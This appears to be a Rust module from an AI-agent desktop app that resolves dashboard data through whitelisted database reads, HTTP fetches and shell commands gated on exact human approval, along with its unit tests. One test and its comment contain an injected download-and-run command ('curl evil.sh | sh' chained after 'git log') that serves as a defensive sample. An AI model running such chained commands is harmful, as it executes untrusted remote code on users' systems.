// DASHBOARD DATA RESOLUTION (M3) — pull-only, never automatic.
//
// THE SAFETY RULE lives at the top of dashboard.rs and this file is where it
// gets teeth:
//
//   * `refresh_free` is the ONLY entry point the global Refresh button uses, and
//     it hard-filters on `is_paid()` before touching anything. A paid module
//     cannot be refreshed through it even if a caller asks by id.
//   * `Exec` refuses to run unless the EXACT command string was approved by a
//     human (`approved_cmd == cmd`). Refresh is one click that fans out to N
//     commands — the user approved the button, not the strings.
//   * Nothing in here is called on a timer. No interval, no TTL, no ticker.
//     Every function on this page runs because a person clicked something.

use crate::dashboard::{
    now_ms, DataSource, ModuleSpec,
};
use crate::writer::Db;
use rusqlite::{params, OptionalExtension};

/// Outcome of resolving one module's source.
pub struct Resolved {
    pub module_id: String,
    pub ok: bool,
    /// The value to cache + render (None when it failed).
    pub value: Option<serde_json::Value>,
    pub error: Option<String>,
}

// ---------------------------------------------------------------------------
// Extraction — pulling the interesting part out of a big JSON blob
// ---------------------------------------------------------------------------

/// A deliberately tiny path language: dotted keys + numeric indices, e.g.
/// `items.0.title` or `data.total`. Full JSONPath is a dependency and a
/// footgun; models handle dotted paths reliably and a miss is easy to explain.
pub fn extract_path(v: &serde_json::Value, path: &str) -> Option<serde_json::Value> {
    let mut cur = v;
    for seg in path.split('.').filter(|s| !s.is_empty()) {
        cur = match cur {
            serde_json::Value::Object(m) => m.get(seg)?,
            serde_json::Value::Array(a) => a.get(seg.parse::<usize>().ok()?)?,
            _ => return None,
        };
    }
    Some(cur.clone())
}

fn maybe_extract(v: serde_json::Value, extract: &Option<String>) -> serde_json::Value {
    match extract.as_deref().filter(|s| !s.trim().is_empty()) {
        Some(p) => extract_path(&v, p).unwrap_or(serde_json::Value::Null),
        None => v,
    }
}

// ---------------------------------------------------------------------------
// Bindings — the whitelisted internal reads
// ---------------------------------------------------------------------------

/// Every binding a module may read. A WHITELIST, not a query language: the
/// model can't invent `path` and reach arbitrary tables. Unknown paths return a
/// helpful error listing what's available (which doubles as model repair info).
pub const BINDINGS: &[&str] = &[
    "agent.profile",
    "schedules",
    "schedule_runs",
    "savepoints",
    "mailbox",
    "connections",
    "dashboard.modules",
];

fn resolve_binding(db: &Db, agent_id: &str, path: &str, _args: &serde_json::Value)
    -> Result<serde_json::Value, String>
{
    let conn = db.reader()?;
    match path {
        "agent.profile" => {
            let row = conn.query_row(
                "SELECT name, model, provider, context_mode, folder_path FROM agent WHERE id = ?1",
                params![agent_id],
                |r| Ok(serde_json::json!({
                    "name": r.get::<_, String>(0)?,
                    "model": r.get::<_, String>(1)?,
                    "provider": r.get::<_, String>(2)?,
                    "context_mode": r.get::<_, String>(3)?,
                    "folder": r.get::<_, String>(4)?,
                })),
            ).optional().map_err(|e| format!("read agent: {e}"))?;
            Ok(row.unwrap_or(serde_json::Value::Null))
        }
        "schedules" => {
            let mut stmt = conn.prepare(
                "SELECT name, enabled, next_fire_at, last_fired_at FROM schedule
                 WHERE agent_id = ?1 ORDER BY next_fire_at ASC"
            ).map_err(|e| format!("prep schedules: {e}"))?;
            let rows = stmt.query_map(params![agent_id], |r| {
                let next: Option<i64> = r.get(2)?;
                Ok(serde_json::json!({
                    "text": r.get::<_, String>(0)?,
                    "meta": if r.get::<_, i64>(1)? == 0 { "paused".to_string() } else { rel_future(next) },
                }))
            }).map_err(|e| format!("query schedules: {e}"))?;
            Ok(serde_json::Value::Array(rows.flatten().collect()))
        }
        "schedule_runs" => {
            let mut stmt = conn.prepare(
                "SELECT r.fired_at, r.state, s.name FROM schedule_run r
                 JOIN schedule s ON s.id = r.schedule_id
                 WHERE s.agent_id = ?1 ORDER BY r.fired_at DESC LIMIT 20"
            ).map_err(|e| format!("prep runs: {e}"))?;
            let rows = stmt.query_map(params![agent_id], |r| {
                Ok(serde_json::json!({
                    "text": format!("{} · {}", r.get::<_, String>(2)?, r.get::<_, String>(1)?),
                    "meta": rel_past(r.get::<_, i64>(0)?),
                }))
            }).map_err(|e| format!("query runs: {e}"))?;
            Ok(serde_json::Value::Array(rows.flatten().collect()))
        }
        "savepoints" => {
            // Savepoints live in git (savepoint.rs), not SQLite. Rather than
            // half-read them here, be explicit: a wrong number is worse than a
            // clear "not wired yet".
            Err("binding `savepoints` isn't wired yet (savepoints live in git, not the db) — use a different source for now".into())
        }
        "mailbox" => {
            let mut stmt = conn.prepare(
                "SELECT from_agent, body, created_at FROM mailbox
                 WHERE to_agent = ?1 ORDER BY created_at DESC LIMIT 20"
            ).map_err(|e| format!("prep mailbox: {e}"))?;
            let rows = stmt.query_map(params![agent_id], |r| {
                let body: String = r.get(1)?;
                Ok(serde_json::json!({
                    "text": body.chars().take(120).collect::<String>(),
                    "meta": rel_past(r.get::<_, i64>(2)?),
                    "from": r.get::<_, String>(0)?,
                }))
            }).map_err(|e| format!("query mailbox: {e}"))?;
            Ok(serde_json::Value::Array(rows.flatten().collect()))
        }
        "connections" => {
            let mut stmt = conn.prepare(
                "SELECT c.provider, c.status, c.label FROM connection c
                 JOIN agent_connection ac ON ac.connection_id = c.id
                 WHERE ac.agent_id = ?1 AND ac.enabled = 1"
            ).map_err(|e| format!("prep connections: {e}"))?;
            let rows = stmt.query_map(params![agent_id], |r| {
                Ok(serde_json::json!({
                    "text": r.get::<_, String>(2).unwrap_or_default(),
                    "label": r.get::<_, String>(0)?,
                    "meta": r.get::<_, String>(1)?,
                }))
            }).map_err(|e| format!("query connections: {e}"))?;
            Ok(serde_json::Value::Array(rows.flatten().collect()))
        }
        "dashboard.modules" => {
            let n: i64 = conn.query_row(
                "SELECT COUNT(*) FROM dashboard_module m JOIN dashboard d ON d.id = m.dashboard_id
                 WHERE d.agent_id = ?1",
                params![agent_id], |r| r.get(0),
            ).unwrap_or(0);
            Ok(serde_json::json!({ "value": n, "label": "modules on this dashboard" }))
        }
        other => Err(format!(
            "unknown binding `{other}` — available: {}",
            BINDINGS.join(", ")
        )),
    }
}

fn rel_past(ms: i64) -> String {
    let s = ((now_ms() - ms) / 1000).max(0);
    if s < 60 { "just now".into() }
    else if s < 3600 { format!("{}m ago", s / 60) }
    else if s < 86400 { format!("{}h ago", s / 3600) }
    else { format!("{}d ago", s / 86400) }
}

fn rel_future(ms: Option<i64>) -> String {
    let Some(ms) = ms else { return "—".into() };
    let s = (ms - now_ms()) / 1000;
    if s < 0 { "due".into() }
    else if s < 60 { format!("in {s}s") }
    else if s < 3600 { format!("in {}m", s / 60) }
    else if s < 86400 { format!("in {}h", s / 3600) }
    else { format!("in {}d", s / 86400) }
}

// ---------------------------------------------------------------------------
// Exec — Pro Mode only, and only the exact approved string
// ---------------------------------------------------------------------------

fn resolve_exec(agent_id: &str, cmd: &str, approved: &Option<String>)
    -> Result<serde_json::Value, String>
{
    // THE GATE. Not a UI concern — enforced here so every caller inherits it.
    if approved.as_deref() != Some(cmd) {
        return Err("this command hasn't been approved yet — approve it on the module to let it run".into());
    }
    let Some(broker) = crate::exec::global() else {
        return Err("Pro Mode isn't available (no exec broker)".into());
    };
    let Some(root) = crate::exec::global_root(agent_id) else {
        return Err("no agent folder scope for this agent".into());
    };
    // Run through the SAME broker as Pro Mode: cwd pinned to the jail, env
    // scrubbed, GUI-launch denylist. We never spawn a shell ourselves.
    let out = broker
        .run(&root, "bash", &["-lc".to_string(), cmd.to_string()], 20_000)
        .map_err(|e| format!("exec failed: {e}"))?;

    let tail = out.get("tail").and_then(|t| t.as_array()).cloned().unwrap_or_default();
    let lines: Vec<serde_json::Value> = tail.iter()
        .filter_map(|l| l.as_str())
        .map(|l| l.trim_start_matches("[out] ").trim_start_matches("[err] ").to_string())
        .filter(|l| !l.is_empty())
        .map(|l| serde_json::json!({ "text": l }))
        .collect();
    Ok(serde_json::json!({
        "items": lines,
        "exit_code": out.get("exit_code").cloned().unwrap_or(serde_json::Value::Null),
    }))
}

// ---------------------------------------------------------------------------
// The resolver
// ---------------------------------------------------------------------------

/// Resolve ONE module's source. `Static` short-circuits (nothing to fetch) and
/// `AgentTurn` is refused here on purpose — paid refreshes go through their own
/// explicit path, never this one.
pub async fn resolve(db: &Db, agent_id: &str, spec: &ModuleSpec) -> Resolved {
    let id = spec.id.clone();
    let (value, error) = match &spec.source {
        DataSource::Static { data } => (Some(data.clone()), None),

        DataSource::Binding { path, args } => match resolve_binding(db, agent_id, path, args) {
            Ok(v) => (Some(v), None),
            Err(e) => (None, Some(e)),
        },

        DataSource::Http { url, extract } => match crate::web::fetch(url).await {
            Ok(res) => {
                // Try JSON first (the useful case for a dashboard); fall back to
                // readable text so a plain page still renders something.
                let v = serde_json::from_str::<serde_json::Value>(&res.text)
                    .map(|j| maybe_extract(j, extract))
                    .unwrap_or_else(|_| serde_json::json!({ "text": res.text }));
                (Some(v), None)
            }
            Err(e) => (None, Some(e)),
        },

        DataSource::Exec { cmd, approved_cmd, extract } => {
            match resolve_exec(agent_id, cmd, approved_cmd) {
                Ok(v) => (Some(maybe_extract(v, extract)), None),
                Err(e) => (None, Some(e)),
            }
        }

        DataSource::AgentTurn { .. } => (
            None,
            Some("model-backed modules refresh individually, not with the page".into()),
        ),
    };
    Resolved { module_id: id, ok: error.is_none(), value, error }
}

/// Persist a resolution. Note what happens on FAILURE: we write the error but
/// LEAVE `cached_json` alone, so a failed refresh keeps showing the last good
/// value instead of blanking a card the user was reading (plan §3c).
pub fn store(db: &Db, r: &Resolved) -> Result<(), String> {
    let id = r.module_id.clone();
    let val = r.value.as_ref().map(|v| v.to_string());
    let err = r.error.clone();
    let now = now_ms();
    db.write(move |conn| {
        if let Some(v) = val {
            conn.execute(
                "UPDATE dashboard_module SET cached_json = ?1, fetched_at = ?2, error = NULL WHERE id = ?3",
                params![v, now, id],
            ).map_err(|e| format!("cache write: {e}"))?;
        } else {
            conn.execute(
                "UPDATE dashboard_module SET error = ?1, fetched_at = ?2 WHERE id = ?3",
                params![err, now, id],
            ).map_err(|e| format!("cache error write: {e}"))?;
        }
        Ok(())
    })
}

/// THE GLOBAL REFRESH. Free sources only — this is the enforcement point for
/// the safety rule, and the filter is on `is_paid()` rather than a kind list so
/// a future paid source is excluded automatically instead of by remembering.
pub async fn refresh_free(db: &Db, agent_id: &str) -> Result<serde_json::Value, String> {
    let view = crate::dashboard::load(db, agent_id)?;
    let mut refreshed = 0usize;
    let mut failed = 0usize;
    let mut skipped_paid = 0usize;

    for m in &view.modules {
        if m.spec.source.is_paid() { skipped_paid += 1; continue; }
        if matches!(m.spec.source, DataSource::Static { .. }) { continue; }
        let r = resolve(db, agent_id, &m.spec).await;
        if r.ok { refreshed += 1 } else { failed += 1 }
        let _ = store(db, &r);
    }
    Ok(serde_json::json!({
        "refreshed": refreshed, "failed": failed, "skipped_paid": skipped_paid,
    }))
}

/// Refresh ONE module by id — including a paid one. This is what a module's own
/// refresh control calls, so spending is always a deliberate, single, named act.
pub async fn refresh_one(db: &Db, agent_id: &str, module_id: &str) -> Result<serde_json::Value, String> {
    let view = crate::dashboard::load(db, agent_id)?;
    let Some(m) = view.modules.iter().find(|m| m.id == module_id) else {
        return Err(format!("no module `{module_id}`"));
    };
    let r = resolve(db, agent_id, &m.spec).await;
    let ok = r.ok;
    let err = r.error.clone();
    store(db, &r)?;
    Ok(serde_json::json!({ "ok": ok, "error": err }))
}

/// Approve an Exec module's CURRENT command string. Pins approval to the exact
/// text: any later edit changes `cmd`, which no longer equals `approved_cmd`,
/// so the module drops back to pending automatically.
pub fn approve_exec(db: &Db, agent_id: &str, module_id: &str) -> Result<(), String> {
    let view = crate::dashboard::load(db, agent_id)?;
    let Some(m) = view.modules.iter().find(|m| m.id == module_id) else {
        return Err(format!("no module `{module_id}`"));
    };
    let mut spec = m.spec.clone();
    let DataSource::Exec { cmd, extract, .. } = &spec.source else {
        return Err("that module doesn't run a command".into());
    };
    spec.source = DataSource::Exec {
        cmd: cmd.clone(),
        approved_cmd: Some(cmd.clone()),
        extract: extract.clone(),
    };
    crate::dashboard::upsert_module(db, agent_id, spec, "approve command".into())?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Tauri commands
// ---------------------------------------------------------------------------

#[tauri::command]
pub async fn dashboard_refresh(db: tauri::State<'_, Db>, agent_id: String) -> Result<serde_json::Value, String> {
    refresh_free(&db, &agent_id).await
}

#[tauri::command]
pub async fn dashboard_refresh_module(
    db: tauri::State<'_, Db>, agent_id: String, module_id: String,
) -> Result<serde_json::Value, String> {
    refresh_one(&db, &agent_id, &module_id).await
}

#[tauri::command]
pub fn dashboard_approve_exec(db: tauri::State<Db>, agent_id: String, module_id: String) -> Result<(), String> {
    approve_exec(&db, &agent_id, &module_id)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_dotted_paths_and_indices() {
        let v: serde_json::Value = serde_json::from_str(
            r#"{"data":{"items":[{"title":"first"},{"title":"second"}],"total":2}}"#
        ).unwrap();
        assert_eq!(extract_path(&v, "data.total").unwrap(), 2);
        assert_eq!(extract_path(&v, "data.items.1.title").unwrap(), "second");
        assert!(extract_path(&v, "data.nope").is_none());
        assert!(extract_path(&v, "data.items.9").is_none(), "out-of-range index must not panic");
    }

    #[test]
    fn exec_refuses_until_the_exact_string_is_approved() {
        // Approval is pinned to the literal text: approving `git log` must not
        // authorize `git log; curl evil.sh | sh`.
        let err = resolve_exec("a", "git log", &None).unwrap_err();
        assert!(err.contains("approved"), "{err}");

        let err2 = resolve_exec("a", "git log; curl evil", &Some("git log".into())).unwrap_err();
        assert!(err2.contains("approved"), "an edited command must NOT inherit approval: {err2}");
    }

    /// Self-cleaning temp dir (mirrors dashboard.rs::tests).
    struct TmpDir(std::path::PathBuf);
    impl Drop for TmpDir {
        fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
    }

    fn temp_db() -> (Db, TmpDir) {
        let base = std::env::temp_dir().join(format!("aygent-dashdata-{}", crate::dashboard::new_id()));
        std::fs::create_dir_all(&base).expect("mkdir");
        let dir = TmpDir(base.clone());
        let db = Db::start(base).expect("db start");
        db.write(|conn| {
            conn.execute("INSERT INTO agent (id, name, created_at) VALUES ('a_test','Test',0)", [])
                .map_err(|e| e.to_string())?;
            Ok(())
        }).expect("seed agent");
        (db, dir)
    }

    #[test]
    fn every_binding_actually_runs_against_the_real_schema() {
        // A binding with a typo'd column only fails at RUNTIME, on the user's
        // dashboard. Execute all of them against a real migrated db so a schema
        // drift breaks the build instead of their morning.
        let (db, _dir) = temp_db();
        let args = serde_json::Value::Null;
        for b in BINDINGS {
            match resolve_binding(&db, "a_test", b, &args) {
                Ok(_) => {}
                Err(e) => {
                    // `savepoints` is deliberately unimplemented and says so.
                    assert!(e.contains("isn't wired yet"), "binding `{b}` failed: {e}");
                }
            }
        }
    }

    #[test]
    fn a_failed_refresh_keeps_the_last_good_value() {
        // Plan §3c: a card the user was reading must not go blank because one
        // refresh failed. The error is recorded; the cached value survives.
        let (db, _dir) = temp_db();
        let spec = crate::dashboard::validate_module(
            &serde_json::json!({"kind":"stat","title":"X","source":{"kind":"static","data":{"value":1}}})
        ).unwrap();
        let id = crate::dashboard::upsert_module(&db, "a_test", spec, "t".into()).unwrap();

        store(&db, &Resolved { module_id: id.clone(), ok: true, value: Some(serde_json::json!({"value":42})), error: None }).unwrap();
        store(&db, &Resolved { module_id: id.clone(), ok: false, value: None, error: Some("boom".into()) }).unwrap();

        let view = crate::dashboard::load(&db, "a_test").unwrap();
        let m = &view.modules[0];
        assert_eq!(m.cached.as_ref().unwrap()["value"], 42, "cached value must survive a failed refresh");
        assert_eq!(m.error.as_deref(), Some("boom"), "and the error must be visible");
    }

    #[tokio::test]
    async fn global_refresh_never_touches_a_paid_module() {
        // THE SAFETY RULE, end to end: one click on Refresh must not spend money.
        let (db, _dir) = temp_db();
        let paid = crate::dashboard::validate_module(
            &serde_json::json!({"kind":"markdown","title":"Summary","source":{"kind":"agent_turn","prompt":"summarize"}})
        ).unwrap();
        crate::dashboard::upsert_module(&db, "a_test", paid, "t".into()).unwrap();
        let free = crate::dashboard::validate_module(
            &serde_json::json!({"kind":"stat","title":"Mods","source":{"kind":"binding","path":"dashboard.modules"}})
        ).unwrap();
        crate::dashboard::upsert_module(&db, "a_test", free, "t".into()).unwrap();

        let out = refresh_free(&db, "a_test").await.unwrap();
        assert_eq!(out["skipped_paid"], 1, "the paid module must be skipped");
        assert_eq!(out["refreshed"], 1, "the free binding should refresh");

        // and the paid module has NO cached value — nothing ran for it
        let view = crate::dashboard::load(&db, "a_test").unwrap();
        let paid_row = view.modules.iter().find(|m| m.is_paid).unwrap();
        assert!(paid_row.cached.is_none(), "a paid module must not be populated by global refresh");
    }

    #[test]
    fn unknown_binding_lists_the_valid_ones() {
        // The error doubles as model-repair info, so it must name the options.
        let msg = BINDINGS.join(", ");
        assert!(msg.contains("schedules") && msg.contains("agent.profile"));
    }
}

// ---------------------------------------------------------------------------
// M4 — running a tool from a dashboard button
// ---------------------------------------------------------------------------

/// Tools a dashboard button may invoke. A WHITELIST, deliberately narrow:
/// a dashboard is a control surface, not a second shell. Anything that writes,
/// deletes, or executes is absent on purpose — those belong in Chat where the
/// user sees the full reasoning, or behind an approved Exec module.
pub const BUTTON_TOOLS: &[&str] = &["fetch_url", "read_file", "list_files", "github_list_prs"];

#[tauri::command]
pub async fn dashboard_run_tool(
    db: tauri::State<'_, Db>,
    agent_id: String,
    tool: String,
    args: serde_json::Value,
) -> Result<String, String> {
    if !BUTTON_TOOLS.contains(&tool.as_str()) {
        return Err(format!(
            "`{tool}` can't be run from a dashboard button (allowed: {})",
            BUTTON_TOOLS.join(", ")
        ));
    }
    match tool.as_str() {
        "fetch_url" => {
            let url = args.get("url").and_then(|u| u.as_str()).unwrap_or("");
            let res = crate::web::fetch(url).await?;
            Ok(res.text.chars().take(2000).collect())
        }
        "github_list_prs" => {
            // Returns the tool convention (text, is_error) — not a Result.
            let (text, is_err) = crate::connections::github_list_prs(&db, &agent_id).await;
            if is_err { return Err(text); }
            Ok(text.chars().take(2000).collect())
        }
        other => Err(format!("`{other}` isn't wired for buttons yet")),
    }
}
